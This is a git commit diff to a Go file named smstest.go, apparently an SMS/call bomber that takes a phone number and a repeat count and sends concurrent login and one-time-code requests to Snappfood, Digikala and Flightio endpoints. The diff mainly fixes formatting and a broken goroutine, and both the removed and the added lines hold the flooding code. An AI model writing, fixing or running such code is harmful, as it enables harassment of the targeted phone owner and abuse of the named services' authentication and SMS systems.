302d5c5728e0c775b01df6b060a9c63dddd55daf
monsmain <matinfarmani20@gmail.com>
2025-04-22 13:08:14 +0330

    Update smstest.go

--- smstest.go
+++ smstest.go
@@ -105,25 +105,25 @@ func main() {
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
 	fmt.Scan(&repeatCount)
 
-	ch := make(chan int)
+ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-	formData := url.Values{}
-	formData.Set("cellphone", phone)
-	requestBody := strings.NewReader(formData.Encode())
-	go func() {
-		resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
-		if err != nil {
-			fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
-			ch <- http.StatusInternalServerError
-			return
-		}
-		defer resp.Body.Close()
-		ch <- resp.StatusCode
-		}, ch)
+		formData := url.Values{}
+		formData.Set("cellphone", phone)
+		requestBody := strings.NewReader(formData.Encode())
+		go func() {
+			resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
+			if err != nil {
+				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
+				ch <- http.StatusInternalServerError
+				return
+			}
+			defer resp.Body.Close()
+			ch <- resp.StatusCode
+		}() 
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
-		}, ch)  
+		}, ch)
 
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
